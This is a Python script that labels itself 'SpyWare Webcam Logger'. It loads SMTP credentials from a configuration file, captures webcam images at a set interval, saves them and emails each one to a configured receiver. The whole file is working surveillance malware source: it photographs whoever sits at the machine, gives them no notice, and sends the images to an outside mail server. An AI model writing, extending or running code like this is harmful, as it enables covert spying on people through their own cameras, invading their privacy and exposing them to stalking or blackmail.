
from os.path import join, dirname, exists
from cv2 import VideoCapture, imwrite
from configparser import ConfigParser
from os import makedirs, environ
from sys import argv, exit
from typing import List
from time import sleep
from glob import glob
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText


def config_load(filename: str = None, argv: List[str] = argv) -> dict:
    """
    This function loads the configuration using a configuration file.
    It assumes that the configuration values are available in the configuration file.
    """
    CONFIG = ConfigParser()
    default_file_name = "webcamSpy.conf"
    default_file_path = join(dirname(__file__), default_file_name)
    env_config_file = environ.get(default_file_name)
    arg_config_file = argv[1] if len(argv) == 2 else None

    # Load configuration from different sources (file, arguments, environment)
    if filename is not None and exists(filename):
        CONFIG.read(filename)
    elif arg_config_file is not None and exists(arg_config_file):
        CONFIG.read(arg_config_file)
    elif env_config_file and exists(env_config_file):
        CONFIG.read(env_config_file)
    elif exists(default_file_path):
        CONFIG.read(default_file_path)
    else:
        print("Configuration file is missing or invalid.")
        return {}

    CONFIG = CONFIG.__dict__["_sections"]

    # Return configuration, without fallbacks
    return {
        "save_filename": CONFIG["SAVE"]["filename"],
        "save_dirname": CONFIG["SAVE"]["dirname"],
        "picture_interval": float(CONFIG["SAVE"]["picture_interval"]),
        "email_sender": CONFIG["EMAIL"]["sender_email"],
        "email_password": CONFIG["EMAIL"]["password"],
        "email_receiver": CONFIG["EMAIL"]["receiver_email"],
        "smtp_server": CONFIG["EMAIL"]["smtp_server"],
        "smtp_port": int(CONFIG["EMAIL"]["smtp_port"]),
    }    

def send_email(image_path: str, config: dict) -> None:
    try:
        # Create the message
        msg = MIMEMultipart()
        msg['From'] = config['email_sender']
        msg['To'] = config['email_receiver']
        msg['Subject'] = "New Webcam Image"

        # Attach the image
        with open(image_path, 'rb') as f:
            img_data = f.read()
        image = MIMEImage(img_data, name=image_path)
        msg.attach(image)

        # Attach a text message
        msg.attach(MIMEText("Here is the latest image captured by your webcam.", 'plain'))

        # Send the email using SMTP
        server = smtplib.SMTP(config['smtp_server'], config['smtp_port'])
        server.starttls()  # Start TLS encryption
        server.login(config['email_sender'], config['email_password'])
        server.sendmail(config['email_sender'], config['email_receiver'], msg.as_string())
        server.quit()
        print(f"Email sent to {config['email_receiver']}")

    except Exception as e:
        print(f"Failed to send email: {e}")

class Daemon:
    def __init__(self, config: dict):
        self.path = join(config['save_dirname'], config['save_filename'])
        self.interval = config['picture_interval']
        self.increment = len(glob(self.path))
        self.run = True
        self.config = config

    def run_for_ever(self) -> None:
        makedirs(self.config['save_dirname'], exist_ok=True)
        path = self.path
        interval = self.interval
        increment = self.increment

        while self.run:
            camera = VideoCapture(0)
            return_value, image = camera.read()

            if not return_value:
                print("Failed to access the camera.")
                camera.release()  # Ensure to release the camera after failure
                sleep(5)  # Wait before trying again
                continue  # Skip this iteration and try again

            del camera

            try:
                # Save the captured image
                image_path = path.replace("*", str(increment))
                imwrite(image_path, image)
                increment += 1
                # Send the image via email
                send_email(image_path, self.config)
            except Exception as e:
                print(f"Failed to save image: {e}")
            
            if self.run:
                sleep(interval)

def main(config_filename: str = None, argv: List[str] = argv) -> int:
    config = config_load(filename=config_filename, argv=argv)

    if not config:
        print("Error loading configuration. Exiting.")
        return 1

    daemon = Daemon(config)

    try:
        daemon.run_for_ever()
    except KeyboardInterrupt:
        daemon.run = False

    return 0

if __name__ == "__main__":
    print("SpyWare Webcam Logger Started...")
    exit(main())
